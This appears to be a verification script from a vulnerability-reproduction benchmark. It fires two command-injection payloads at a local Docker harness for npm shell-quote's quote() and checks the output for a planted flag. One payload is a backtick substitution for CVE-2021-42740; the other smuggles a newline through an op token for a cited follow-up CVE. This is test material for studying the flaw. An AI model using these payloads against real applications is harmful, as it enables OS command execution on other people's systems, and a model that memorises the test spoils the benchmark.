#!/usr/bin/env bash
# verify.sh --seed|--residual — shell-quote-cve-2026-9277（CVE-2021-42740 -> CVE-2026-9277）
#
# 漏洞机制：npm shell-quote 的 quote() 负责把每个 token 渲染成惰性 shell 字面量；若某个元字符
# 逃逸失败，拼出的 `echo ok <quote(tokens)>` 经 child_process.exec('/bin/sh -c ...') 执行时被注入
# （CWE-78 OS 命令注入）。同一 quote() 函数的不同分支：
#   seed     (CVE-2021-42740, STRING else 分支): V0@1.7.2 的 drive-letter 前缀类 [A-z] 也匹配
#             ASCII 96 的反引号（介于 Z=90 与 a=97 之间），`` `:;rf`:; `` 的反引号经 $1 原样重发
#             -> 命令替换执行 PATH 上种植的 ":;rf"（cat /canary/flag.txt）-> V0 达 flag；
#             V1@1.7.3 修复 [A-z]->[A-Za-z]，反引号被转义 -> 阻断。
#   residual (CVE-2026-9277, OBJECT op 分支): V1 的 op 逃逸用 s.op.replace(/(.)/g,'\$1')，
#             JS 正则 '.' 不匹配行终止符，{op:';\n/canary/rf'} 中的换行原样穿过 -> 成为 POSIX
#             命令分隔符，第二行执行 /canary/rf -> V1 达 flag（不完整修复）；V2@1.8.4 对 op 做
#             allowlist + 行终止符拒绝（quote() 抛 TypeError，命令未构建）-> 阻断。
# 效果通道 = GET /probe?tokens=<JSON> 响应 JSON 的 'output' 字段（注入命令 cat 出 planted
#            ${PCB_FLAG}；正常字面量 echo 永远不含 flag）。
# 探测方式 = 自包含 python（与 poc/seed_exec.py 同语义：urlencode 的 tokens JSON 打 /probe），
#            宿主端口用 docker compose port 解析（fallback 固定映射 39900/39901/39902）。
# 判定基准 = RUN_FLAG_REF（平台注入的真 flag；wrong/stale 检查时 RUN_FLAG 为 override，
#            判定必须用 RUN_FLAG_REF，回退 RUN_FLAG）。
# 退出码：0=效果发生（RUN_FLAG_REF 出现在效果通道） 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="$RUN_FLAG"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 宿主端口：优先 compose 动态映射，fallback 固定映射表（compose 与 poc/seed_exec.py BASE 一致）
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=39900;; v1) PORT=39901;; v2) PORT=39902;;
  esac
fi
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"

# 就绪等待：node harness 冷启动较慢，起来前不探测（避免把启动慢误判为 10/20）
for _ in $(seq 1 60); do
  if curl -fsS -m 2 "http://127.0.0.1:$PORT/" >/dev/null 2>&1; then break; fi
  sleep 1
done
if ! curl -fsS -m 2 "http://127.0.0.1:$PORT/" >/dev/null 2>&1; then
  echo "verify: harness not ready on port $PORT" >&2
  exit 20
fi

# probe <seed|residual>：构造 tokens JSON -> GET /probe -> 'output' 字段含 FLAG_REF -> 0；
#                         HTTP 无 flag -> 10；无响应 -> 20
probe() {
  local mode="$1" rc
  "$PY" - "$PORT" "$FLAG_REF" "$VERSION" "$mode" <<'PYEOF'
import json, sys, urllib.error, urllib.parse, urllib.request

port, flag, version, mode = sys.argv[1:5]
mode = mode.lstrip("-")          # shell 传入 "--seed"/"--residual"，归一化为 seed/residual
if mode == "seed":
    # CVE-2021-42740：STRING token，前导 "`:" 被 V0 过宽的 [A-z] 前缀类吞掉 -> 反引号未转义
    tokens = ["`:;rf`:;"]
else:
    # CVE-2026-9277：OBJECT op token，换行未被 V1 的 (.) 逐字符转义 -> POSIX 命令分隔符
    tokens = [{"op": ";\n/canary/rf"}]

q = urllib.parse.urlencode({"tokens": json.dumps(tokens)})
url = "http://127.0.0.1:%s/probe?%s" % (port, q)
try:
    with urllib.request.urlopen(url, timeout=25) as r:
        body = r.read().decode("utf-8", "replace")
        status = r.getcode()
except urllib.error.HTTPError as e:
    status = e.code
    body = e.read().decode("utf-8", "replace")
except Exception as e:
    print("[probe %s] request error: %r" % (version, e), file=sys.stderr)
    sys.exit(20)

out = body
try:
    parsed = json.loads(body)
    out = parsed.get("output", "")          # 效果通道 = 命令输出（quote_error 时为空）
    built = parsed.get("built")
    print("[probe %s] built=%r quote_error=%r" % (version, built, parsed.get("quote_error")), file=sys.stderr)
except Exception:
    pass
print("[probe %s] status=%s tokens=%s output_head=%r" % (version, status, tokens, out[:160]))
sys.exit(0 if flag in out else 10)
PYEOF
  rc=$?
  echo "[probe $VERSION] mode=$mode flag_ref=$FLAG_REF -> rc=$rc" >&2
  return $rc
}

probe "$MODE"
rc=$?
echo "verify[$MODE] version=$VERSION rc=$rc (flag_ref=$FLAG_REF)" >&2
exit "$rc"
